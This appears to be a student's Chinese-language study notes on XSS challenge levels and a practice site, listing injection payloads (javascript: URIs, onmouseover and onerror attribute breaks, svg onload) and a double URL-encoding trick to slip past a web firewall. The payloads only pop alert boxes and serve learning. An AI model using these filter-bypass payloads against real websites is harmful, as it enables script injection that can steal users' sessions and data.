![image-20220116131328786](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116131328786.png)

通过测试得到：必须要包含http://

```
http://
```

用level8测试发现不可以：

```
http://&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;

http://javascript:alert(1)
```

那么思考：

```
javascript:alert(1)//http://

&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://
```



## level10

![image-20220116141718033](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116141718033.png)

```
<script>alert(1)</script>
```

![image-20220116141811028](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116141811028.png)

发现多了表单：

那么尝试传参：

```
?keyword=<script>alert(1)</script>&t_link=1&t_history=2&t_sort=3
```

![image-20220116142657484](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116142657484.png)

```
?keyword=1&t_sort=3"type="text" onclick="alert(1)
```

DOM型XSS



## level11

![image-20220116143420788](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116143420788.png)

![image-20220116143433447](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116143433447.png)

发现有referer的http头，可能需要抓包：

## level12

修改user-agent

## level13

修改cookie



```
<svg%0aonload=alert(1)> 
<svg onload=alert(1)> 

onload直接加载
```





# XSS实战

```
<img src="xxx" onerror=alert("xss")>

<input type='text' name='words' id='words' value='123 '/><img ' class='form-control' placeholder='' /> 

'/><img
被防火墙拦截

'/><img 一次编码
防火墙判断
交给一个程序判断 一次解码
search-index-123'/><img-1.html 当作一个文件来访问访问不到，404

'/><img 二次编码
防火墙判断
交给一个程序判断 一次解码
search-index-[一次编码的内容]-1.html 进行搜索
防火墙进行解码，判断是否有img script ....，
有就替换为空搜索结果

<input type='text' name='words' id='words' value=' 123 ' onmouseover='alert(1) '/>

123' onmouseover='alert(1)

编码两次

123'/><script>alert(1)</script><img
首先把<script>前后标签都urlencode一次，整体encode两次

```



## 具体思路

![image-20220116162355693](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116162355693.png)

尝试输入

可以得到是GET提交：

![image-20220116174955000](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116174955000.png)

![image-20220116175006485](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116175006485.png)

查看源代码：

搜索查找输入的内容，发现：

![image-20220116162503832](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116162503832.png)

![image-20220116162522276](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116162522276.png)

有三处可交互。

那么最可能利用xss漏洞的地方应该在第三处：

```
 <input type='text' name='words' id='words' value='123' class='form-control' placeholder='' /> 
```



此时可以在URL栏里的：

`http://chanzhi7.njhack.xyz/www/index.php/search-index-123-1.html`或`/www/index.php/search/?words=123 HTTP/1.1`

进行修改和输入



那么我们可以考虑选择提前闭合的方式：`'/>'`

因为js里的语言比较松散，例如`<img`在没有`>`的时候也可以执行，因此我们可以先拿`<img`来尝试：

```
<img src="xxx" onerror=alert("xss")>
```

输入：

```
123'/><img
```

![image-20220116181301733](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116181301733.png)

由所得页面了解到：我们的命令被防火墙打掉了。



那么我们可以试试URL编码一次：

![image-20220116181846471](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116181846471.png)

![image-20220116181301733](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116181301733.png)

还是被防火墙打掉了

那么再编码一次呢？

![image-20220116181921465](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116181921465.png)

由得到页面中：

`The requested URL /www/index.php/search-index-123'/><img-1.html was not found on this server.`

可得知我们输入的内容被当做文件名来处理了，那么可以猜测该网站的创建思路：

```
'/><img
被防火墙拦截

'/><img 一次编码
防火墙判断
交给一个程序判断 一次解码
search-index-123'/><img-1.html 当作一个文件来访问访问不到，404

'/><img 二次编码
防火墙判断
交给一个程序判断 一次解码
search-index-[一次编码的内容]-1.html 进行搜索
```

并且此时查看源代码，发现：

```
img script ....可能都被整块替换了。
```

所以完整思路应该是：

```
'/><img
被防火墙拦截

'/><img 一次编码
防火墙判断
交给一个程序判断 一次解码
search-index-123'/><img-1.html 当作一个文件来访问访问不到，404

'/><img 二次编码
防火墙判断
交给一个程序判断 一次解码
search-index-[一次编码的内容]-1.html 进行搜索

防火墙进行解码，判断是否有img script ....，
有就替换为空搜索结果
```



## 那么,绕过方案：

方案一：

可以只用单引号闭合并使用`onmouseover`直接操作，而无需另加img和script的标签头：

```
123' onmouseover='alert(1)
```

并且编码两次（如果是在`/www/index.php/search/?words=123 `目录下传参，则需要编码三次）

![image-20220116183418847](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/04%20XSS%E5%AE%9E%E6%88%98.assets/image-20220116183418847.png)



方案二：

通过单独再多编码一次对img、script进行处理以绕过过滤：

```
123'/><script>alert(1)</script><img
首先把<script>前后标签都urlencode一次，整体encode两次

123'/><script>alert(1)</script>

123'/><img src="xxx" onerror=alert("xss")>
同理可得
```



